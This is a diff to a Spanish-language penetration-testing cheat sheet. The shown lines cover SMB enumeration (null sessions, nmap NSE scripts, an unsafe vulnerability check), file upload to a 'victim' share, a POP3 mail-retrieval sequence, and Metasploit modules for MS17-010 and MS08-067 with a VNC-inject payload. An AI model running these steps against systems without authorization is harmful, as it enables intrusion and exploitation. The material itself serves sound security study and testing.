@@ -71,11 +71,13 @@ nslookup
 Enumerar info SMB
 	enum4linux -a IP
 	nbtscan -r RED
-	smbclient -L IP // Lista recursos compartidos en la máquina
+	smbclient -L //IP // Lista recursos compartidos en la máquina con null session
+	smbclient -U [username] -L [IP target]
 	smb-enum-shares.nse -p445
+	nbstat.nse -p 137 // Netbios expuestos
 	smb-os-discovery.nse
-	smb-enum-users.nse
-  smbclient -U [username] -L [IP target]
+	smb-enum-users.nse -p U:137,T:139
+  	smb-check-vulns --script-args=unsafe=1 -p 445
   	Para acceder a los directorios -> smbclient \\\\[IP Target]\\[Share al que accedemos, carpeta compartida o Share por defecto] -U [username]
   	put [archivo] (sube el archivo al directorio del ordenador víctima)
   use auxiliary/scanner/smb/smb_ms17_010
@@ -87,6 +89,12 @@ Enumerar info SMB
     use exploit/windows/smb/ms08_067_netapi => Puede que necesite bind_tcp
     payload windows/vncinject/bind_tcp
 
+#POP3
+telnet IP 110
+USER usuario
+PASS password
+list
+retr NUMERO
 
 #RPC
 rpcinfo -p IP
